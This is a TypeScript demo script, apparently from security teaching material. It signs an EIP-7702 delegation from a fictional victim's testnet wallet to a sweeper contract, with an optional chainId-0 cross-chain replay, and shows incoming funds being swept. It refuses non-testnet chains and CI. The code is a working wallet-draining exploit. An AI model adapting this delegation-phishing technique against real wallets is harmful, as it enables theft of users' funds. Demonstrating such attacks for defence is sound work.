// DEMO ONLY — delegates Mdm Tan's (fictional) testnet wallet to a sweeper to show the attack.
// REFUSES any non-testnet chain. NEVER run in CI. Testnet throwaway keys only.
//
// Flags:
//   --chain sepolia|base-sepolia|arbitrum-sepolia   (required)
//   --chain-id-zero                                 (sign with chainId 0 — cross-chain replay demo)
//   --prove-sweep                                   (send 0.001 testnet ETH and show it is swept)
//
// Env: TAN_PRIVATE_KEY (the victim EOA), PRIVATE_KEY (the relayer paying gas), SWEEPER (address).

import { createWalletClient, createPublicClient, http, parseEther, type Hex, type Chain } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { sepolia, baseSepolia, arbitrumSepolia } from "viem/chains";
import { TESTNET_CHAIN_IDS } from "../src/chains";

const CHAINS: Record<string, Chain> = {
  sepolia,
  "base-sepolia": baseSepolia,
  "arbitrum-sepolia": arbitrumSepolia,
};

function arg(name: string): string | undefined {
  const i = process.argv.indexOf(name);
  return i !== -1 ? process.argv[i + 1] : undefined;
}
function has(name: string): boolean {
  return process.argv.includes(name);
}

async function main() {
  if (process.env.CI) throw new Error("phish-tan refuses to run in CI");

  const chainName = arg("--chain");
  const chain = chainName ? CHAINS[chainName] : undefined;
  if (!chain) throw new Error("--chain must be one of: sepolia, base-sepolia, arbitrum-sepolia");
  if (!TESTNET_CHAIN_IDS.has(chain.id)) {
    throw new Error(`phish-tan refuses non-testnet chain ${chainName} (id ${chain.id})`);
  }

  const tanKey = process.env.TAN_PRIVATE_KEY as Hex | undefined;
  const relayerKey = process.env.PRIVATE_KEY as Hex | undefined;
  const sweeper = process.env.SWEEPER as Hex | undefined;
  if (!tanKey || !relayerKey || !sweeper) {
    throw new Error("need TAN_PRIVATE_KEY, PRIVATE_KEY and SWEEPER env vars");
  }

  const tan = privateKeyToAccount(tanKey);
  const relayer = privateKeyToAccount(relayerKey);
  const pub = createPublicClient({ chain, transport: http() });
  const wallet = createWalletClient({ account: relayer, chain, transport: http() });

  const chainIdZero = has("--chain-id-zero");
  console.log(`victim (Tan): ${tan.address}`);
  console.log(`sweeper:      ${sweeper}`);
  console.log(`chain:        ${chainName} (${chain.id})${chainIdZero ? " [chainId=0 replay]" : ""}`);

  // sign the 7702 authorization from Tan, relayer submits it
  const authorization = await wallet.signAuthorization({
    account: tan,
    contractAddress: sweeper,
    ...(chainIdZero ? { chainId: 0 } : {}),
  });

  const hash = await wallet.sendTransaction({
    authorizationList: [authorization],
    to: tan.address,
    value: 0n,
  });
  console.log(`delegation tx: ${hash}`);

  const code = await pub.getBytecode({ address: tan.address });
  console.log(`eth_getCode(tan) = ${code ?? "0x"}`);

  if (has("--prove-sweep")) {
    const before = await pub.getBalance({ address: tan.address });
    const sweepTx = await wallet.sendTransaction({ to: tan.address, value: parseEther("0.001") });
    console.log(`sweep tx: ${sweepTx}`);
    const after = await pub.getBalance({ address: tan.address });
    console.log(`tan balance before ${before} wei, after ${after} wei (swept to thief)`);
  }
}
main().catch((e) => { console.error(String(e)); process.exit(1); });
